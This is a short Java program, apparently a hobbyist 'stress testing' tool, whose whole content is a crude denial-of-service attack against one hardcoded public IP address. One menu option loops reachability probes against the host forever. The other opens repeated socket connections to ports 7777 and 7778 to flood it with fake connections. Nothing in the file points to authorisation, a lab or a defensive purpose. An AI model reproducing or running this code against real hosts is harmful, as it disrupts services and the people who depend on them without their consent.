import java.awt.AWTException;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;


public class hax {
	//Display welcome message
	hax() { 
	}
	
	public static void main(String[] args) throws AWTException {
		Scanner in = new Scanner(System.in);
		//Send the welcome message
		System.out.println("Welcome to the swordfish stress testing program for Athena...");
		//Display a menu
		//TODO Add more features!
		System.out.println("Choose one option.\n1. Attempt DoS\n2. Spam x number of connections\3. Exit");
		int answer = in.nextInt();
		
		switch(answer) { 
		case 1: try {
				Dos();
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		break;
		case 2: 
			try {
				SpamX();
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		break;
		case 3: System.exit(0);
		break;
		}
	}

	private static void SpamX() throws UnknownHostException, IOException {
		// TODO Auto-generated method stub
		Scanner in = new Scanner(System.in);
		System.out.println("Enter how many times you would like to fake a connection with Aegis.");
		int x = in.nextInt();
		for(int y=0; y<=x; y++) { 
		Socket clientSocket = new Socket("71.232.78.143", 7777 );
		Socket serverSocket = new Socket("71.232.78.143", 7778 );
		}		
	}

	private static void Dos() throws InterruptedException, IOException {
		// TODO Auto-generated method stub
		InetAddress address = InetAddress.getByName("71.232.78.143");
		Scanner in = new Scanner(System.in);
		System.out.println("Will commence DoS in 5 seconds...");
		//Sleep for 5
		Thread.sleep(5000);
		while(true) { 
			 address.isReachable(3000);
		}
	}
		
	}
	

